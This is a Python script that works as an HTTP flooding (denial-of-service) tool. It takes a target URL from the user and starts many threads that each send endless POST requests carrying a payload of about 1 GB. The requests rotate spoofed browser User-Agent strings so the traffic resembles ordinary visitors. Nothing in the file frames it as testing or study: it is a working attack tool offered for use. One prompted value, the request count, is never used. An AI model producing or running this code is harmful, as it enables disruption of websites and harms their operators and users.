import requests
import threading
import random

# Get URL, number of requests, and number of threads from user
url = input("Enter the target URL: ")
num_requests = int(input("Enter the number of requests to send per thread: "))
num_threads = int(input("Enter the number of threads: "))

# List of User-Agents to mimic different browsers
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 Edge/113.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
]

# Function to create a large payload
def generate_large_payload(size_gb):
    # Create a large payload with dummy data
    size_bytes = size_gb * 1024 * 1024 * 1024  # Convert GB to bytes
    payload = {'data': 'A' * size_bytes}
    return payload

# Create a large payload of approximately 1 GB
payload = generate_large_payload(1)

# Function to send requests
def send_requests():
    while True:  # Loop tanpa henti untuk membuat beban berat
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        try:
            response = requests.post(url, headers=headers, data=payload)  # Menggunakan POST dengan payload besar
            print(f"Request sent, response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

# Creating and starting threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True
    threads.append(thread)

for thread in threads:
    thread.start()

# Keep the main thread alive
while True:
    pass
